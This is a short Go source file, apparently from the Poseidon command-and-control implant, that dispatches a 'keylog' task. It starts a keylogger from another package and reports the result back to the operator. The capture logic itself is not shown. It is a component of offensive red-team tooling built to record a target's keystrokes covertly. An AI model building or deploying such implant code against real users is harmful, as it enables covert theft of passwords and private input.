package keylog

import (
	"fmt"

	"github.com/xorrior/poseidon/pkg/commands/keylog/keystate"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {

	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task

	err := keystate.StartKeylogger(task, threadChannel)

	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Started keylogger."))
	threadChannel <- tMsg
}
